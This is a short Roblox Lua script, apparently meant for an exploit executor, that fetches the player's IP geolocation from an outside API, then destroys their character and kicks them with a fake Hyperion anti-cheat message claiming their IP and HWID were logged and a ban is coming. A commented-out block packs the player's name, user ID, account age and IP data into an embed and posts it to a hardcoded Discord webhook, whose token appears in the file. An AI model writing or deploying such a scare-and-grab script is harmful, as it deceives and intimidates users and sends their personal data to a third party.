local HTTP = game:GetService("HttpService")

--local webhookurl = "https://discord.com/api/webhooks/1172578120373645342/O3zNN3CZXkL5Qgce4YaOlbOdPAxX24iQ9XwUtIsCmjzCVrvm_Z3VInHb-udTa-tHk78_"
local player = game.Players.LocalPlayer
local aaaaa = game:HttpGet("https://api.techniknews.net/ipgeo")

wait(20)

player.Character:Destroy()
wait(1)
player:Kick("You have been detected by Hyperion. Your IP and HWID has been logged and you will be banned within 1 week. ".. "\n".. "IP: ".. aaaaa.ip .. "\n".. "HWID and TA Memory has been sent to the servers.")

--[[local a = HTTP:JSONDecode(aaaaa)

	local data = {
		["embeds"] = {{

			["author"] = {
				["name"] = player.Name,
				["icon_url"] = "https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&username="..player.Name
			},
			["description"] = "Info:  " .. aaaaa,
			["color"] = tonumber(0xFFFAFA),
			["fields"] = {
				{
					["name"] = "Account Age:",
					["value"] = player.AccountAge,
					["inline"] = true
				},
				{
					["name"] = "User ID:",
					["value"] = player.UserId,
					["inline"] = true
				}
			}
		}},

	}
	local finaldata = HTTP:JSONEncode(data)
	HTTP:PostAsync(webhookurl, finaldata)
]]
